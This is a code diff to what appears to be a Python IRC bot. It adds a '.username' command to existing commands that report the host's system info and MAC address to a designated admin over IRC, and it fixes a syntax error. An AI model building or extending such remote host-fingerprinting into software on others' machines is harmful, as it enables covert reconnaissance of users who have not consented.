@@ -160,6 +160,10 @@ def uname(): # Used to get system info for .uname command
     sysinfo = platform.uname()
     return sysinfo
 
+def username():
+    usrnm = os.getenv('USER', os.getenv('USERNAME', 'user'))
+    return usrnm
+
 def macaddress():
     ma = ':'.join(hex(uuid.getnode()).strip('0x').strip('L')[i:i+2] for i in range(0,11,2)).upper()
     return ma
@@ -375,9 +379,13 @@ def main():
                 if name.lower() == adminname.lower() and message.find('.uname') != -1:
                     sendntc("System Info: " + format(uname()), adminname)
                     
+                # Respond to '.username' command from admin.
+                if name.lower() == adminname.lower() and message.find('.username') != -1:
+                    sendntc("Username: " + format(username()), adminname)
+                    
                 # Respond to '.macaddress' command from admin.
                 if name.lower() == adminname.lower() and message.find('.macaddress') != -1:
-                    sendntc("Mac Address: " + format(macaddress()), adminname
+                    sendntc("Mac Address: " + format(macaddress()), adminname)
                     
                 # Respond to '.sysinfo' command from admin.
                 if name.lower() == adminname.lower() and message.find('.sysinfo') != -1:
